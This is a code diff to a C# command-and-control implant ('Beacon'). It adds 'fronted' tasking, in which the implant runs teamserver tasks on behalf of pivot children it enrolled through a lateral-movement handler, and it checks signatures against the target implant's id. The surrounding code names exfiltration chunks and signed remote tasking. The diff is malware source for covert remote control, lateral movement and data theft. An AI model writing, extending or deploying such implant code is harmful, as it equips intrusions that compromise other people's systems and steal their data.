@@ -47,6 +47,11 @@ internal sealed class Beacon
     private readonly IReadOnlyList<string> _classVerbs;
     private readonly TextWriter _log;
 
+    // The fronted-pivot ledger (architecture.md Sec 5.2): the Pivot children
+    // this implant enrolled, whose tasking this stream executes. Null when
+    // derivation is disabled (no enroll bundle) -- nothing is fronted then.
+    private readonly FrontedPivots? _fronted;
+
     // The replay-nonce state (architecture.md Sec 9 -- tasking replay nonces):
     // the accepted-nonce floor spans the implant's whole run, so a captured
     // frame replayed after a reconnect still falls at or below it.
@@ -101,6 +106,11 @@ internal sealed class Beacon
         // the dev stub, generated per build when an extension directory is
         // configured.
         _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
+        // The same bundle's fronted ledger (Sec 5.2): the lateral.move handler
+        // records each Pivot child into it, and the tasking loop above gates
+        // fronted tasking on it -- one instance, shared by derivation and
+        // fronting.
+        _fronted = enroll?.Fronted;
         _classVerbs = classVerbs;
         _log = log;
     }
@@ -273,17 +283,50 @@ internal sealed class Beacon
 
                 var task = TaskRequest.Parser.ParseFrom(frame.Payload);
 
+                // Fronted tasking (architecture.md Sec 5.2): a frame marked
+                // with another implant's id is a Pivot child's tasking this
+                // stream executes on the child's behalf -- the child has no
+                // process to check in with. The gate is the fronted ledger:
+                // only a child this implant enrolled is frontable, so tasking
+                // for any other implant is refused on the task even when the
+                // signature verifies (the signature binds the tuple to the
+                // target id, Sec 9; it does not say this implant fronts the
+                // target).
+                var targetId = _implantId;
+                var fronted = false;
+                if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
+                {
+                    targetId = task.TargetImplantId;
+                    fronted = true;
+                    if (_fronted is null || !_fronted.Knows(targetId))
+                    {
+                        _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
+                        await WriteFrameAsync(
+                            call, writeGate,
+                            ResultFrame(task, TaskOutcome.Failed,
+                                $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"),
+                            cancellationToken);
+                        continue;
+                    }
+                }
+
                 // Command signing (architecture.md Sec 9): verify the teamserver's
                 // signature before any handler runs, and -- once the replay-nonce
                 // arm is live -- that the task's nonce advances the accepted
                 // floor. A task that fails either is reported Failed with the
                 // cause -- the operator sees the rejection on the task itself,
                 // so a replayed frame surfaces as a refused task -- and nothing
-                // executes.
+                // executes. The signed tuple's implant id is the target's own:
+                // this implant's for own tasking, the fronted child's for
+                // fronted tasking. The nonce arm follows the target too -- a
+                // pivot child never handshakes, so its tasking keeps the
+                // nonce-less shape and a fresh tracker keeps this implant's
+                // negotiated floor from refusing it.
                 TaskOutcome outcome;
                 string output;
                 IReadOnlyList<ExfilChunk> chunks;
-                var verdict = TaskingVerifier.Verify(_implantId, task, _cas, _nonces);
+                var verdict = TaskingVerifier.Verify(
+                    targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
                 if (verdict != TaskingVerdict.Accepted)
                 {
                     var cause = verdict switch
